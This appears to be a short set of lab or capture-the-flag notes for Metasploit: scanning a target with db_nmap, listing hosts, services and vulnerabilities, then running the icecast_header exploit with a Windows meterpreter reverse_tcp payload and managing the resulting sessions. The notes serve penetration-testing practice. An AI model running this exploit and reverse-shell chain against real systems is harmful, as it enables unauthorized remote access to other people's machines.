# Task 5

## Run nmap and feed it's results into the database

```bash
db_nmap -sV 'BOX-IP' -vv
```

## See the list of services in a list

```bash
services
```

## Information collected into the database

```bash
hosts
```

## See vulnerabilities

```bash
vulns
```

## Use an exploit

```bash
use icecast
exploit/windows/http/icecast_header
```

## Use an exploit shorthand

```text
# 'exploit ID'
```

## set the payload using this command

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 'YOUR_IP'  # run 'ip addr'
```

## select target

```bash
set RHOSTS 'BOX_IP'
```

## Run the exploits via

```bash
exploit
run -j # this will run it in the background
```

## See jobs

```bash
jobs
```

## List sessions

```bash
sessions
sessions -i 'session_number'
```
